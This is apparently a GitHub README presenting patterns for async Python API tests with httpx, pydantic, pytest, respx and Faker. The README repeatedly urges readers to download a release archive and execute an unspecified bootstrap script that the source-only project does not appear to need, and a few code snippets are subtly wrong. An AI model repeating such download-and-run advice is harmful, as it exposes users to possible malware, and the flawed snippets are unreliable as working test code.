[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/moresuy/python-api-tests-async/releases)

# Async Python API Tests: Clean, Maintainable, Practical Testing Patterns

![API testing illustration](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1350&q=80)

A practical repository that shows how to write async API tests in Python. It focuses on clear structure, reliable clients, strong typing with pydantic, test isolation using pytest and pytest-asyncio, HTTP mocking, and realistic data generation. Use the code and patterns in this repo to build repeatable, readable, and maintainable tests for your APIs.

[![Download Releases](https://img.shields.io/badge/Download%20Releases-%20%20Click%20Here-24292e?logo=github)](https://github.com/moresuy/python-api-tests-async/releases)

Table of contents
- Project goals
- Key features
- Topics and technologies
- Repository layout
- Installation and quick start
- Example async client
- Pydantic models for requests/responses
- Test helpers and fixtures
- Example tests
- Advanced patterns: mocking, replay, and CI
- Logging and diagnostics
- Best practices and design notes
- Contributing
- License
- Releases

Project goals
- Show clear patterns for async API tests in Python.
- Keep tests small and focused.
- Use typed models for payloads and responses.
- Use async clients and test runners.
- Provide reusable fixtures and helpers.
- Allow tests to run offline using mocks and recorded responses.

Key features
- Async HTTP client implementation with httpx AsyncClient.
- Typed models via pydantic for request and response validation.
- Test runner based on pytest and pytest-asyncio.
- Data generation with Faker for realistic inputs.
- Mocking and request interception using respx.
- Structured logging for tests and client calls.
- Opinionated fixtures for clean setup and teardown.
- Example CI job snippets to run tests in pipelines.

Topics and technologies
api-client, api-testing, api-testing-framework, api-tests, async, asyncio, best-practices, faker, httpx, httpx-client, logging, pydantic, pytest, python, test-automation, test-automation-framework, testing, tests

Repository layout
- src/
  - client/
    - http_client.py        # Async HTTP client wrapper
    - auth.py               # Simple token management
    - endpoints.py          # Endpoint functions
  - models/
    - user.py               # pydantic request/response models
    - common.py             # shared models
  - utils/
    - logging.py            # logging setup
    - faker_factories.py    # test data factories
- tests/
  - conftest.py            # pytest fixtures
  - test_users.py          # example tests
  - test_error_cases.py    # negative tests
  - integration/           # optional integration tests
- docs/
  - design.md
  - ci.md
- pyproject.toml or requirements.txt
- README.md

Installation and quick start

Requirements
- Python 3.10+ recommended
- Poetry or pip
- Network access for live tests

Clone the repo and install dependencies:
```bash
git clone https://github.com/moresuy/python-api-tests-async.git
cd python-api-tests-async
# With pip
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
# Or with poetry
poetry install
```

Releases
Download the release asset from the Releases page and execute the included script to bootstrap local fixtures and sample data:
- Visit https://github.com/moresuy/python-api-tests-async/releases
- Download the release file (zip or tar.gz) for your platform.
- Extract and run the provided bootstrap script to install pinned dependencies and generate sample env files.

Example async client
A thin wrapper around httpx AsyncClient keeps tests readable and consistent. The client handles timeouts, base URL, headers, and JSON encoding/decoding. It returns typed pydantic models where appropriate.

src/client/http_client.py
```python
from typing import Any, Dict, Optional
import httpx
from pydantic import BaseModel
from .auth import TokenProvider
from ..utils.logging import get_logger

logger = get_logger(__name__)

class APIError(Exception):
    pass

class AsyncAPIClient:
    def __init__(
        self,
        base_url: str,
        token_provider: Optional[TokenProvider] = None,
        timeout: float = 10.0,
    ) -> None:
        self.base_url = base_url.rstrip('/')
        self.token_provider = token_provider
        self.timeout = timeout
        self._client = httpx.AsyncClient(base_url=self.base_url, timeout=self.timeout)

    async def close(self) -> None:
        await self._client.aclose()

    async def _auth_headers(self) -> Dict[str, str]:
        if self.token_provider:
            token = await self.token_provider.get_token()
            return {"Authorization": f"Bearer {token}"}
        return {}

    async def request(self, method: str, path: str, json: Optional[Dict[str, Any]] = None) -> Any:
        url = path if path.startswith("http") else f"{self.base_url}{path}"
        headers = await self._auth_headers()
        logger.debug("Request %s %s", method, url)
        try:
            resp = await self._client.request(method, url, json=json, headers=headers)
        except httpx.RequestError as exc:
            logger.error("Network error: %s", exc)
            raise APIError("Network error") from exc

        logger.debug("Response %s %s", resp.status_code, resp.text)
        if resp.is_error:
            raise APIError(f"{resp.status_code}: {resp.text}")
        if resp.content:
            return resp.json()
        return None
```

Pydantic models for requests/responses
Use pydantic models to validate interactions. Tests remain expressive and safe.

src/models/user.py
```python
from pydantic import BaseModel, EmailStr, Field
from typing import Optional

class UserCreate(BaseModel):
    email: EmailStr
    name: str = Field(min_length=1)
    password: str = Field(min_length=8)

class UserResponse(BaseModel):
    id: str
    email: EmailStr
    name: str
    created_at: Optional[str]
```

Test helpers and fixtures
Organize fixtures in tests/conftest.py. Keep fixtures small. Use scope function for per-test isolation, module for heavier resources.

tests/conftest.py
```python
import pytest
import asyncio
from httpx import AsyncClient
from src.client.http_client import AsyncAPIClient
from src.utils.faker_factories import UserFactory
from src.utils.logging import configure_logging
import respx
from respx import MockRouter

@pytest.fixture(scope="session", autouse=True)
def logging_setup():
    configure_logging(level="DEBUG")

@pytest.fixture
async def api_client():
    client = AsyncAPIClient(base_url="https://api.example.local")
    yield client
    await client.close()

@pytest.fixture
def user_factory():
    return UserFactory()

@pytest.fixture
def mock_http():
    with respx.mock(base_url="https://api.example.local") as mock:
        yield mock
```

User factory with Faker
Use factories to generate valid payloads. Keep factories deterministic when seed is provided.

src/utils/faker_factories.py
```python
from faker import Faker
from typing import Dict
faker = Faker()

class UserFactory:
    def __init__(self, seed: int | None = None):
        if seed is not None:
            Faker.seed(seed)

    def build_payload(self) -> Dict[str, str]:
        return {
            "email": faker.safe_email(),
            "name": faker.name(),
            "password": faker.password(length=12)
        }
```

Example tests
Show core patterns. Keep each test focused on one behavior. Mock external services for deterministic tests.

tests/test_users.py
```python
import pytest
from src.models.user import UserCreate, UserResponse
import respx
from httpx import Response

@pytest.mark.asyncio
async def test_create_user_success(api_client, user_factory, mock_http):
    payload = user_factory.build_payload()
    user_resp = {
        "id": "user_123",
        "email": payload["email"],
        "name": payload["name"],
        "created_at": "2024-01-01T00:00:00Z"
    }

    mock_http.post("/users").respond(200, json=user_resp)

    data = await api_client.request("POST", "/users", json=payload)
    user = UserResponse.parse_obj(data)

    assert user.id == "user_123"
    assert user.email == payload["email"]
    assert user.name == payload["name"]

@pytest.mark.asyncio
async def test_create_user_invalid_password(api_client, user_factory, mock_http):
    payload = user_factory.build_payload()
    payload["password"] = "short"

    error = {"message": "password too short"}
    mock_http.post("/users").respond(400, json=error)

    with pytest.raises(Exception):
        await api_client.request("POST", "/users", json=payload)
```

Test structure rules
- One assertion per key behavior.
- Arrange, Act, Assert pattern in each test.
- Use factories for inputs.
- Use pydantic to validate output shapes.
- Mock HTTP at the transport layer with respx.
- Keep tests fast. Favor mocked tests for unit-level checks.

Advanced patterns: mocking and replaying
- Use respx to mock httpx requests. It works with pytest fixtures.
- Use VCR-like recording for integration tests to record real server responses and replay them. Use vcrpy or a custom recording tool.
- Store recorded responses in tests/fixtures/records. Use clear naming and metadata.
- For real integration tests, keep them separate under tests/integration and gate them in CI with environment variables.

Sample respx usage for matching headers and routes
```python
import respx
from httpx import Response

def test_match_headers(mock_http):
    route = mock_http.get("/whoami").mock(
        return_value=Response(200, json={"user": "bot"})
    )
    # Optionally assert header matching
    route.request.headers["Authorization"] = "Bearer .*"
```

CI configuration
- Run lint and tests in separate jobs.
- Use a job for unit tests that runs with respx mocks and no network.
- Use a gated job for integration tests that run against stage environment.
- Cache pip or Poetry to speed builds.
- Run tests with pytest -q for concise output.

Sample GitHub Actions job
```yaml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v4
        with:
          python-version: "3.10"
      - name: Install deps
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
      - name: Run tests
        run: pytest -q
```

Logging and diagnostics
- Use structured log output in tests.
- Capture logs on test failures for fast root cause analysis.
- Add a fixture that writes logs to a per-test file in a temp dir.

src/utils/logging.py
```python
import logging
import sys

def configure_logging(level="INFO"):
    root = logging.getLogger()
    root.setLevel(level)
    handler = logging.StreamHandler(sys.stdout)
    fmt = "%(asctime)s %(levelname)s %(name)s - %(message)s"
    handler.setFormatter(logging.Formatter(fmt))
    root.handlers = [handler]

def get_logger(name):
    return logging.getLogger(name)
```

Best practices and design notes
- Keep tests deterministic. Use mocks for unit tests.
- Use factories to create realistic payloads.
- Use pydantic models to validate responses. Fail fast on schema mismatch.
- Keep clients thin. Move logic into the application code under test. The client should only encode and decode.
- Prefer exception types that carry context. Add custom APIError where needed.
- Close AsyncClient instances to avoid warnings.
- Use respx to scope mocks to individual tests. Reset mocks after each test.
- Group integration tests in a separate folder and separate job in CI.
- Pin dependency versions in production or use lock files for stable builds.
- Use type hints across codebase for better maintenance.
- Run tests under multiple Python versions in CI when you support a range.

Design decisions explained
- httpx AsyncClient: It supports asyncio natively and integrates with respx.
- pydantic: It gives runtime validation and clear errors that help tests fail at the right place.
- pytest-asyncio: It supports async test functions with minimal ceremony.
- respx: It intercepts httpx calls at the transport layer. It gives control without needing to patch internals.
- Faker: It generates varied data so tests exercise parsing, validation, and edge cases.

Test matrix and coverage
- Unit tests: fast, mocked HTTP.
- Integration tests: real or recorded HTTP. Run less often.
- Contract tests: verify that client models stay aligned with API contracts. Keep them in their own suite.

Example of a contract test
- Use a known schema as source of truth.
- Validate live responses against schema.
- Run this test in integration or pre-release job.

Edge cases and error handling
- Validate timeouts and retry behavior.
- Test 4xx and 5xx responses path.
- Test malformed responses: missing fields, wrong types.
- Test network errors by raising httpx.RequestError in mock.

Performance tips
- Share a single AsyncClient in tests when safe. Use module-scoped fixture when repeated setup is costly.
- For parallel test runs, avoid global state or file collisions.
- Use respx to mock external dependencies so tests run fast.

Sample project-level guidelines for test authors
- Add a test file per feature or endpoint group.
- Name tests with clear actions and expected results.
- Keep test functions under 30 lines.
- Mock external services that are out of your control.
- Write assertions that target behavior, not implementation.

Working with secure secrets
- Use environment variables for API keys during integration tests.
- Add a .env.example that lists expected variables.
- Use a secret manager integration in CI, not hardcoded values.

Example .env.example
```
API_BASE_URL=https://api.example.local
API_TOKEN=replace_me
```

Handling flaky tests
- Run flaky tests under a separate label.
- Capture full logs for failure analysis.
- Add retries to tests only with explicit reason in test metadata.

Release and packaging
- Tag releases and publish source artifacts on GitHub releases.
- Provide a release asset that bootstraps environment or ships sample data.
- The Releases page contains the downloadable asset. Download the release asset from https://github.com/moresuy/python-api-tests-async/releases and run the included script to set up pinned tooling and sample test data.

Contributing
- Follow the repository style and patterns.
- Open an issue to propose major changes.
- Keep pull requests small.
- Include tests for new logic.
- Run formatting and lint checks before submitting a PR.

Suggested checklist for PRs
- Add or update tests for new behavior.
- Run pytest locally.
- Update docs or comments when APIs change.
- Keep commit messages short and descriptive.

Common commands
- Run unit tests
  pytest tests -q

- Run a single test file
  pytest tests/test_users.py -q

- Run with detailed output
  pytest -vv

- Run with coverage (if configured)
  coverage run -m pytest && coverage report

- Run linters
  flake8 src tests

Maintainers and contacts
- Use GitHub issues for bug reports and feature requests.
- Use pull requests for code changes.
- Link maintainers in CODEOWNERS if your repo uses it.

Images and badges
- Use badges at top for quick info: downloads, build, coverage.
- Use an image for a header to make README more readable.
- Keep images hosted on reliable services.

Security
- Do not commit secrets.
- Use test tokens for integration tests.
- Rotate tokens and revoke test accounts after use.

Examples of common testing patterns
- Test the happy path first.
- Test each error case that the API returns.
- Test concurrency by launching multiple async calls and gather results with asyncio.gather.
- Use pydantic to assert shape. Example:
```python
result = await api_client.request("GET", "/users/1")
UserResponse.parse_obj(result)
```

Async concurrency example test
```python
import asyncio

@pytest.mark.asyncio
async def test_multiple_user_fetch(api_client, mock_http):
    user_ids = ["a", "b", "c"]
    for uid in user_ids:
        mock_http.get(f"/users/{uid}").respond(200, json={"id": uid, "email": f"{uid}@x.com", "name": uid})

    async def get_user(uid):
        data = await api_client.request("GET", f"/users/{uid}")
        return data

    results = await asyncio.gather(*(get_user(uid) for uid in user_ids))
    assert len(results) == 3
```

FAQ (brief)
- Q: How to run integration tests?
  A: Set environment variables for API base URL and token, then run tests in tests/integration.

- Q: How to record live responses?
  A: Use vcrpy or a custom recording fixture. Store recordings in tests/fixtures/records.

- Q: How to mock external auth?
  A: Use respx to intercept auth token endpoints or provide a token provider fixture that returns a test token.

Style and naming
- Keep function and variable names descriptive.
- Name tests like test_action_when_condition_expected_result.
- Use snake_case for functions and variables.

Appendix: sample files to copy
- requirements.txt
```
httpx>=0.24.0
pytest>=7.0
pytest-asyncio>=0.20
pydantic>=1.10
faker>=18.0
respx>=0.20
```
- pyproject.toml example if using Poetry
```toml
[tool.poetry]
name = "python-api-tests-async"
version = "0.1.0"
description = "Async API tests reference patterns"
authors = ["Your Name <you@example.com>"]

[tool.poetry.dependencies]
python = "^3.10"
httpx = "^0.24"
pydantic = "^1.10"
faker = "^18.0"

[tool.poetry.dev-dependencies]
pytest = "^7.0"
pytest-asyncio = "^0.20"
respx = "^0.20"
```

Releases and assets
- The releases page lists assets for each tagged version.
- Download the release asset and run the included bootstrap script to prepare test data and pin tool versions.
- Visit https://github.com/moresuy/python-api-tests-async/releases to get the latest release asset.

Images and extra resources
- Use the image above for a header. Replace with your own if you host docs.
- Add architecture diagrams under docs/ as PNG or SVG to explain test flows.

License
- Choose a license that fits your needs (MIT, Apache-2.0, or similar).
- Add a LICENSE file to the repo.

Files to add to your repository
- README.md (this file)
- LICENSE
- .gitignore
- requirements.txt or pyproject.toml
- tests/ and src/ directories as shown

End of README content.